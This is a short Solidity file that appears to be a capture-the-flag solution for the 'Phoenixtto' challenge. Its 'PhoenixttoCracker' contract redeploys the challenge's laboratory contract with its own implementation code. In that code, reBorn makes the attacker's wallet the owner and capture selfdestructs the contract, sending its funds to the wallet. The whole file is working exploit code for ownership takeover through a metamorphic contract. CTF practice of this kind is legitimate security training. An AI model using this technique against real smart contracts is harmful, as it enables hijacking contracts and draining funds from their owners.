// SPDX-License-Identifier: AGPL-3.0-or-later
pragma solidity 0.8.17;

import { Phoenixtto, Laboratory } from "eko/ChallengePhoenixtto.sol";

contract PhoenixttoCracker {
  constructor(Laboratory laboratory, address wallet) {
    laboratory.reBorn(abi.encodePacked(type(Implementation).creationCode, abi.encode(wallet)));
  }
}

contract Implementation {
  address public immutable wallet;
  address public owner;

  constructor(address wallet_) {
    wallet = wallet_;
  }

  function reBorn() external {
    owner = wallet;
  }

  function capture(string memory) external {
    selfdestruct(payable(wallet));
  }
}
